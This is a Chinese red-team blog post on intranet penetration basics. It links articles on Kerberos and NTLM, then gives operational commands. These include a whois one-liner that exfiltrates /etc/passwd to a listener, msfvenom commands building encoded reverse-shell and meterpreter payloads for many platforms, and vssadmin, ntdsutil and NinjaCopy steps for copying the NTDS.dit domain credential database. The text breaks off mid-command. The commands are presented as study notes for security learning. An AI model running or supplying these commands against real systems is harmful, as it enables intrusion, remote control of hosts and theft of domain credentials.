<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="&#34;auto&#34;"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/img/favicon.png"><link rel="icon" type="image/png" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/img/favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="description" content="没有天生的大牛，更没有永远的菜鸟求知若饥 , 虚心若愚"><meta name="author" content="iceH"><meta name="keywords" content=""><title>红队攻防学习之内网渗透基础 - iceH’s Blog</title><link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="/lib/hint/hint.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/css/gundongtiao.css# 滚动条颜色.css"><link rel="stylesheet" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/css/shubiao.css# 鼠标指针.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><link rel="stylesheet" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/css/valine.css"><script id="fluid-configs">var Fluid=window.Fluid||{},CONFIG={hostname:"www.secice.cn",root:"/",version:"1.8.5",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1},toc:{enable:!0,headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"right",visible:"hover",icon:""},copy_btn:!0,image_zoom:{enable:!0},lazyload:{enable:!0,onlypost:!1},web_analytics:{enable:!1,baidu:null,google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null}}}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="iceH’s Blog" type="application/atom+xml">
</head><body><header style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/">&nbsp;<strong>iceH's Blog</strong>&nbsp;</a> <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> 首页</a></li><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="iconfont icon-books"></i> 博文</a><div class="dropdown-menu" aria-labelledby="navbarDropdown"><a class="dropdown-item" href="/archives/"><i class="iconfont icon-archive-fill"></i> 归档 </a><a class="dropdown-item" href="/categories/"><i class="iconfont icon-category-fill"></i> 分类 </a><a class="dropdown-item" href="/tags/"><i class="iconfont icon-tags-fill"></i> 标签</a></div></li><li class="nav-item"><a class="nav-link" target="_blank" rel="noopener" href="https://wiki.secice.cn/"><i class="iconfont icon-kaggle"></i> Wiki</a></li><li class="nav-item"><a class="nav-link" href="/playlist/"><i class="iconfont icon-music"></i> 音乐</a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> 关于</a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> 友链</a></li><li class="nav-item" id="search-btn"><a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a></li></ul></div></div></nav><div class="banner intro-2" id="background" parallax="true" style="background:url(https://gitee.com/sec-pengyy/sec-pengyy/raw/master/img/background1.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="page-header text-center fade-in-up"><span class="h2" id="subtitle" title="红队攻防学习之内网渗透基础"></span><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2020-12-30 13:52" pubdate>2020年12月30日 下午</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 2.2k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 32 分钟</span></div></div></div></div></div></header><main><div class="container-fluid"><div class="row"><div class="d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-md"><div class="container nopadding-md" id="board-ctn"><div class="py-5" id="board"><article class="post-content mx-auto"><h1 style="display:none">红队攻防学习之内网渗透基础</h1><div class="markdown-body"><h1 id="八、内网渗透基础"><a href="#八、内网渗透基础" class="headerlink" title="八、内网渗透基础"></a>八、内网渗透基础</h1><h2 id="8-1-Kerberos协议"><a href="#8-1-Kerberos协议" class="headerlink" title="8.1 Kerberos协议"></a>8.1 Kerberos协议</h2><h3 id="8-1-1-Windows认证原理之Kerberos篇"><a href="#8-1-1-Windows认证原理之Kerberos篇" class="headerlink" title="8.1.1 Windows认证原理之Kerberos篇"></a>8.1.1 Windows认证原理之Kerberos篇</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">5004</span>  ---Kerberos Security

https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/artech/</span>archive<span class="hljs-regexp">/2011/</span><span class="hljs-number">01</span><span class="hljs-regexp">/24/</span>kerberos.html   ---Windows安全认证是如何进行的？[Kerberos篇]

https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1596509</span>   --Windows认证 | 域认证

https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">190261</span>   --Windows内网协议学习Kerberos篇之ASREQ&amp; ASREP （深入理解）</code></pre><p>这四篇文章，仔细看完，你会基本理解Kerberos原理…</p><hr><h2 id="8-2-NTLM"><a href="#8-2-NTLM" class="headerlink" title="8.2 NTLM"></a>8.2 NTLM</h2><h3 id="8-2-1-NTLM协议及Hash抓取"><a href="#8-2-1-NTLM协议及Hash抓取" class="headerlink" title="8.2.1 NTLM协议及Hash抓取"></a>8.2.1 NTLM协议及Hash抓取</h3><p>Windows安全认证有两种方式：Kerberos和NTLM</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6600</span>

https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1480923</span></code></pre><p>这两篇诠释了NTLM协议及Hash抓取…</p><hr><h3 id="8-2-2-Windows认证原理之NTLM篇"><a href="#8-2-2-Windows认证原理之NTLM篇" class="headerlink" title="8.2.2 Windows认证原理之NTLM篇"></a>8.2.2 Windows认证原理之NTLM篇</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/u/</span><span class="hljs-number">4587410</span><span class="hljs-regexp">/blog/</span><span class="hljs-number">4435334</span>   ---Windows认证原理入门篇

https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">193149</span>   ---Windows内网协议学习NTLM篇之NTLM基础介绍

https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/-qing-/</span>p/<span class="hljs-number">11343859</span>.html   ---域渗透基础之NTLM认证协议</code></pre><p>书上只是基础的讲解了，这里三篇文章详细深入的讲解了NTLM</p><hr><h2 id="8-3-内网命令行渗透笔记"><a href="#8-3-内网命令行渗透笔记" class="headerlink" title="8.3 内网命令行渗透笔记"></a>8.3 内网命令行渗透笔记</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/bmjoker/</span>p/<span class="hljs-number">10336247</span>.html  

https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1665868</span>

https:<span class="hljs-regexp">//</span>www.mi1k7ea.com<span class="hljs-regexp">/2020/</span><span class="hljs-number">02</span><span class="hljs-regexp">/27/</span>内网信息收集之本机信息收集/

https:<span class="hljs-regexp">//uu</span>zdaisuki.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">05</span><span class="hljs-regexp">/05/</span>内网渗透常用命令总结（windows）/

https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/u/</span><span class="hljs-number">4399281</span><span class="hljs-regexp">/blog/</span><span class="hljs-number">3581418</span></code></pre><p>这里集合很多，学会就基本差不多了，我的笔记我不透漏了，大部分是htb上集合的和文章里的…</p><hr><h2 id="8-4-内网渗透中的文件传输"><a href="#8-4-内网渗透中的文件传输" class="headerlink" title="8.4 内网渗透中的文件传输"></a>8.4 内网渗透中的文件传输</h2><p><strong>利用whois传输文件：</strong></p><p>传输机：</p><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@john:~# whois -h <span class="hljs-number">127.0.0.1</span> -p <span class="hljs-number">4444</span> `cat /etc/passwd | base<span class="hljs-number">64</span>`</code></pre><p>接受机：</p><pre><code class="hljs awk">root@john:<span class="hljs-regexp">/tmp# nc -l -v -p 4444 | sed &quot;s/</span> <span class="hljs-regexp">//g</span><span class="hljs-string">&quot; | base64 -d</span></code></pre><p>优点：适用于隐蔽传输。最小化被发现。<br>缺点：适用于传输小文件。</p><hr><h2 id="8-5-msfvenom常用生成payload命令"><a href="#8-5-msfvenom常用生成payload命令" class="headerlink" title="8.5 msfvenom常用生成payload命令"></a>8.5 msfvenom常用生成payload命令</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows:"></a><strong>windows:</strong></h3><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -a x<span class="hljs-number">86</span> --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e x<span class="hljs-number">86</span>/shikata_ga_nai -b &#x27;x<span class="hljs-number">00</span>x<span class="hljs-number">0</span>axff&#x27; -i <span class="hljs-number">3</span> -f exe -opayload.exe</code></pre><h3 id="mac"><a href="#mac" class="headerlink" title="mac:"></a><strong>mac:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP
<span class="hljs-attribute">LPORT</span>=攻击机端口 -f macho -o payload.macho</code></pre><h3 id="android"><a href="#android" class="headerlink" title="android:"></a><strong>android:</strong></h3><pre><code class="hljs awk"><span class="hljs-regexp">//</span>需要签名
msfvenom -a x86 --platform Android -p android<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk</code></pre><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell:"></a><strong>powershell:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=
攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -e cmd/powershell_base64 -i 3 -f<span class="hljs-built_in"> raw </span>-o payload.ps1</code></pre><h3 id="linux"><a href="#linux" class="headerlink" title="linux:"></a><strong>linux:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f elf -o payload.elf</code></pre><h3 id="php"><a href="#php" class="headerlink" title="php:"></a><strong>php:</strong></h3><pre><code class="hljs routeros">msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.php
cat shell.php | pbcopy &amp;&amp; echo <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="hljs-string">&#x27;n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></pre><h3 id="aspx"><a href="#aspx" class="headerlink" title="aspx:"></a><strong>aspx:</strong></h3><pre><code class="hljs awk">msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=
攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx</code></pre><h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp:"></a><strong>jsp:</strong></h3><pre><code class="hljs routeros">msfvenom --platform java -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o payload.jsp</code></pre><h3 id="war"><a href="#war" class="headerlink" title="war:"></a><strong>war:</strong></h3><pre><code class="hljs routeros">msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-
o payload.war</code></pre><h3 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs:"></a><strong>nodejs:</strong></h3><pre><code class="hljs routeros">msfvenom -p nodejs/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o
payload.js</code></pre><h3 id="python"><a href="#python" class="headerlink" title="python:"></a><strong>python:</strong></h3><pre><code class="hljs routeros">msfvenom -p python/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -
f<span class="hljs-built_in"> raw </span>-o payload.py</code></pre><h3 id="perl"><a href="#perl" class="headerlink" title="perl:"></a><strong>perl:</strong></h3><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_perl <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o
payload.pl</code></pre><h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby:"></a><strong>ruby:</strong></h3><pre><code class="hljs routeros">msfvenom -p ruby/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o
payload.rb</code></pre><h3 id="lua"><a href="#lua" class="headerlink" title="lua:"></a><strong>lua:</strong></h3><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_lua <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o
payload.lua</code></pre><h3 id="windows-shellcode"><a href="#windows-shellcode" class="headerlink" title="windows shellcode:"></a><strong>windows shellcode:</strong></h3><pre><code class="hljs awk">msfvenom -a x86 --platform Windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=
攻击机IP LPORT=攻击机端口 -f c</code></pre><h3 id="linux-shellcode"><a href="#linux-shellcode" class="headerlink" title="linux shellcode:"></a><strong>linux shellcode:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻
击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f c</code></pre><h3 id="mac-shellcode"><a href="#mac-shellcode" class="headerlink" title="mac shellcode:"></a><strong>mac shellcode:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP
<span class="hljs-attribute">LPORT</span>=攻击机端口 -f c</code></pre><h3 id="便捷化payload生成"><a href="#便捷化payload生成" class="headerlink" title="便捷化payload生成:"></a><strong>便捷化payload生成:</strong></h3><p>项目地址:</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Screetsec/</span>TheFatRat</code></pre><pre><code class="hljs awk">root@John:~<span class="hljs-regexp">/Desktop# git clone https:/</span><span class="hljs-regexp">/github.com/</span>Screetsec/TheFatRat.git
<span class="hljs-regexp">//</span>设置时需要挂墙</code></pre><p><strong>附录:</strong><br><strong>中文使用说明:</strong><br><strong>Options:</strong></p><pre><code class="hljs livecodeserver">-p, <span class="hljs-comment">--payload &lt;payload&gt; 使用指定的payload</span>
<span class="hljs-comment">--payload-options 列出该payload参数</span>
-l, <span class="hljs-comment">--list [type] 列出所有的payloads</span>
-n, <span class="hljs-comment">--nopsled &lt;length&gt; 为payload指定一个 nopsled 长度</span>
-f, <span class="hljs-comment">--format &lt;format&gt; 指定payload生成格式</span>
<span class="hljs-comment">--help-formats 查看所有支持格式</span>
-e, <span class="hljs-comment">--encoder &lt;encoder&gt; 使用编码器</span>
-<span class="hljs-keyword">a</span>, <span class="hljs-comment">--arch &lt;arch&gt; 指定payload构架</span>
<span class="hljs-comment">--platform &lt;platform&gt; 指定payload平台</span>
<span class="hljs-comment">--help-platforms 显示支持的平台</span>
-s, <span class="hljs-comment">--space &lt;length&gt; 设定payload攻击荷载的最大长度</span>
<span class="hljs-comment">--encoder-space &lt;length&gt; The maximum size of the encoded payload</span>
(defaults <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> -s <span class="hljs-built_in">value</span>)
-b, <span class="hljs-comment">--bad-chars &lt;list&gt; 指定bad-chars 如: &#x27;x00xff&#x27;</span>

-i, <span class="hljs-comment">--iterations &lt;count&gt; 指定编码次数</span>
-c, <span class="hljs-comment">--add-code &lt;path&gt; 指定个win32 shellcode 文件</span>
-x, <span class="hljs-comment">--template &lt;path&gt; 指定一个 executable 文件作为模板</span>
-k, <span class="hljs-comment">--keep payload自动分离并注入到新的进程</span>
-o, <span class="hljs-comment">--out &lt;path&gt; 存放生成的payload</span>
-v, <span class="hljs-comment">--var-name &lt;name&gt; 指定自定义变量</span>
<span class="hljs-comment">--smallest Generate the smallest possible payload</span>
-h, <span class="hljs-comment">--help 显示帮助文件</span></code></pre><pre><code class="hljs css"><span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.kanxue</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">book-38-445</span><span class="hljs-selector-class">.htm</span>   高级渗透第十课</code></pre><hr><h2 id="8-6-windows环境压缩文件-amp-文件夹命令合集"><a href="#8-6-windows环境压缩文件-amp-文件夹命令合集" class="headerlink" title="8.6 windows环境压缩文件&amp;文件夹命令合集"></a>8.6 windows环境压缩文件&amp;文件夹命令合集</h2><p>本篇文章会介绍几种常用的 windows打包、压缩文件&amp;文件夹的方法。</p><p><strong>压缩工具 Winrar</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/u2s1/</span>winrarsc</code></pre><p>实际使用情况,直接把 Winrar.exe上传至目标机即可, Winrar大约400k。</p><p>常用压缩命令为 :</p><pre><code class="hljs stylus">C:\RECYCLER\Winrar<span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">a</span> -k -r -s -m5 tmp<span class="hljs-selector-class">.rar</span> srcdir</code></pre><p>常用解压命令为：</p><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\R</span>ECYCLER<span class="hljs-symbol">\W</span>inrar.exe x -t -o -p d:<span class="hljs-symbol">\w</span>eb.rar d:<span class="hljs-symbol">\d</span>esdir

desdir文件夹需存在</code></pre><hr><p><strong>压缩工具7za</strong></p><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//www<span class="hljs-number">.7</span>-zip<span class="hljs-meta">.org</span>   --官网</code></pre><p>7za常用命令<br>查看压缩文件内容(如判断目标机上压缩文件是否有价值)</p><pre><code class="hljs aspectj"><span class="hljs-number">7</span>za l <span class="hljs-keyword">target</span>.zip</code></pre><p>常用压缩命令如下</p><p>按照默认压缩类型进行压缩,7za会自动遍历所压缩文件夹内的子文件、子文件夹，默认压缩类型为7z即参数-a -t7z，其中-mx9为7z模式中UItra compressing</p><pre><code class="hljs apache"><span class="hljs-attribute">7za</span> a -mx=<span class="hljs-number">9</span> archive<span class="hljs-number">1</span>.zip test</code></pre><p>如果需要使用其他压缩类型，如zip</p><pre><code class="hljs stata">7za a -tzip archive1.<span class="hljs-keyword">zip</span> <span class="hljs-keyword">test</span></code></pre><p>常用解压缩命令如下，too文件夹7za自动创建。</p><pre><code class="hljs taggerscript">7za x tmp.7z c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\t</span>ool</code></pre><p>或者压缩文件、文件夹时，需排除某些文件夹，不压缩上面-x 后面的文件夹内文件，文件夹名有空格需用双引号引起来，命令如下</p><p>排除文件</p><pre><code class="hljs apache"><span class="hljs-attribute">7za</span> a archive<span class="hljs-number">1</span>.zip test -x!treeNMS-<span class="hljs-number">1</span>.<span class="hljs-number">7</span>.<span class="hljs-number">4</span>.zip</code></pre><p>排除文件夹</p><pre><code class="hljs stata">7za a archive1.<span class="hljs-keyword">zip</span> <span class="hljs-keyword">test</span> -xr!serverbak</code></pre><hr><p><strong>使用 windows自带压缩文件命令</strong></p><p><strong>makecab压缩文件命令</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/hkmax/</span>blog/<span class="hljs-number">144293</span>   --makecab 方法</code></pre><p>makecab可压缩单个文件或多个文件,但无法压缩文件夹压缩单个文件命令为</p><pre><code class="hljs apache"><span class="hljs-attribute">makecab</span> <span class="hljs-number">1</span>. txt <span class="hljs-number">1</span>.zip</code></pre><p><strong>expand解压缩命令</strong></p><p>解压缩test1.cab至c:\windows\temp\tool目录，tool目录必须存在</p><pre><code class="hljs taggerscript">expand D:<span class="hljs-symbol">\d</span>ayu<span class="hljs-symbol">\t</span>est1.cab -f:* c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\t</span>ool</code></pre><p><strong>zip.vbs解压方法</strong></p><p>windows文件管理器自带压缩、解压缩功能( zipped)，属于explorer的功能，无法命令行调用，具体介绍传送门( <a target="_blank" rel="noopener" href="https://filext.com/faq/compressed_zip_folder.html)%EF%BC%8C%E6%AD%A4%E5%A4%84zip.vbs%E4%B8%BA%E8%B0%83%E7%94%A8COM%E6%8E%A5%E5%8F%A3%E4%BB%8E%E8%80%8C%E8%B0%83%E7%94%A8%E8%87%AA%E5%B8%A6%E7%9A%84">https://filext.com/faq/compressed_zip_folder.html)，此处zip.vbs为调用COM接口从而调用自带的</a> explorer zip</p><p>压缩文件命令为</p><pre><code class="hljs stata"><span class="hljs-keyword">CScript</span> <span class="hljs-keyword">zip</span>.vbs C:\<span class="hljs-keyword">test</span> C:\target.<span class="hljs-keyword">zip</span></code></pre><p><strong>powershell缩文件夹</strong></p><p>将文件或文件夹test压缩为test.zip</p><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-built_in">Compress</span><span class="hljs-operator">-</span><span class="hljs-variable">Archive</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-built_in">D</span><span class="hljs-operator">:</span>\<span class="hljs-variable">test</span> <span class="hljs-operator">-</span><span class="hljs-variable">DestinationPath</span> <span class="hljs-built_in">E</span><span class="hljs-operator">:</span>\<span class="hljs-variable">test</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span></code></pre><p>将文件test.zip解压到test目录下</p><pre><code class="hljs stata">powershell <span class="hljs-keyword">Expand</span>-Archive -Path <span class="hljs-keyword">E</span>:\<span class="hljs-keyword">test</span>.<span class="hljs-keyword">zip</span> -DestinationPath F:\<span class="hljs-keyword">test</span></code></pre><hr><h2 id="8-7-Windows-net-命令集使用"><a href="#8-7-Windows-net-命令集使用" class="headerlink" title="8.7 Windows net 命令集使用"></a>8.7 Windows net 命令集使用</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/iriczhao/</span>p/<span class="hljs-number">10469143</span>.html

https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1459966</span>

https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span>b35078a6f030</code></pre><p>认真看完知道有个概念即可！！！</p><hr><h2 id="8-8-Cobaltstrike与Metasploit实战联动"><a href="#8-8-Cobaltstrike与Metasploit实战联动" class="headerlink" title="8.8 Cobaltstrike与Metasploit实战联动"></a>8.8 Cobaltstrike与Metasploit实战联动</h2><ul><li><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4304822/blog/3328524">https://my.oschina.net/u/4304822/blog/3328524</a></li></ul><hr><h2 id="8-9-渗透中常用的复制工具"><a href="#8-9-渗透中常用的复制工具" class="headerlink" title="8.9 渗透中常用的复制工具"></a>8.9 渗透中常用的复制工具</h2><p>在渗透中经常需要复制像NTDS.dit、mssql数据库文件等关键文件。由于这些文件都被占用,所以不能直接复制。下面介绍几个常用的命令or工具来实现复制</p><h3 id="VSSadmin"><a href="#VSSadmin" class="headerlink" title="VSSadmin"></a><strong>VSSadmin</strong></h3><p>域环境默认安装。</p><p><strong>使用：</strong></p><p>创建卷影</p><pre><code class="hljs routeros">vssadmin create shadow /<span class="hljs-attribute">for</span>=c:</code></pre><p>获取当前卷影</p><pre><code class="hljs ebnf"><span class="hljs-attribute">vssadmin list shadow</span></code></pre><p>从卷影复制文件</p><pre><code class="hljs taggerscript">copy <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy2<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\N</span>TDS<span class="hljs-symbol">\n</span>tds.dit c:<span class="hljs-symbol">\n</span>tds.dit</code></pre><p>删除卷影</p><pre><code class="hljs awk">vssadmin <span class="hljs-keyword">delete</span> shadows <span class="hljs-regexp">/for=c: /</span>quiet</code></pre><hr><h3 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a><strong>ntdsutil</strong></h3><p>域环境默认安装</p><p>创建快照</p><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;activate instance ntds&quot;</span> create <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span></code></pre><p>挂载快照</p><pre><code class="hljs subunit">ntdsutil snapshot &quot;mount &#123;22508acf<span class="hljs-string">-8</span>a01<span class="hljs-string">-4322</span><span class="hljs-string">-867</span>d<span class="hljs-string">-383</span>cf78f59e3&#125; quit quit
快照挂载为C:\$SNAP_201912231558_V0LUMEC$\，copy ntds即可</code></pre><p>卸载快照</p><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;unmount &#123;22508acf-8a01-4322-867d-383cf78f59e3&#125;&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span></code></pre><p>删除快照</p><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;delete &#123;22508acf-8a01-4322-867d-383cf78f59e3&#125;&quot;</span> create <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span></code></pre><hr><h3 id="Vshadow"><a href="#Vshadow" class="headerlink" title="Vshadow"></a><strong>Vshadow</strong></h3><p>不是系统默认工具，可在Microsoft SDK中获取</p><p>创建快照</p><pre><code class="hljs stylus">vshadow<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">p</span> -nw C:</code></pre><p>获取快照列表</p><pre><code class="hljs css"><span class="hljs-selector-tag">vshadow</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-q</span></code></pre><p>复制</p><pre><code class="hljs mipsasm">copy <span class="hljs-keyword">Shadow </span>copy device <span class="hljs-string">&quot;Name&quot;</span>\windows\NTDS\ntds.<span class="hljs-keyword">dit </span>c:\ntds.<span class="hljs-keyword">dit </span></code></pre><p>删除快照</p><pre><code class="hljs dust"><span class="xml">vshadow -ds=</span><span class="hljs-template-variable">&#123;ID&#125;</span></code></pre><h3 id="Ninjacopy"><a href="#Ninjacopy" class="headerlink" title="Ninjacopy"></a><strong>Ninjacopy</strong></h3><p>ninjacopy是powersploit中的一个powershell脚本直接使用 Invoke-NinjaCopy -Path &lt;需要复制的文件&gt; -LocalDestination &lt;复制文件保存位置&gt; 即可复制</p><p><strong>VolumeShadowCopyTools</strong></p><p>属于powersploit的项目，地址VolumeShadowCopyTools，之前遇到上面介绍的方法都不能复制数据库文件，使用这个工具成功复制</p><p>创建卷影</p><pre><code class="hljs dockerfile">New-VolumeShadowCopy 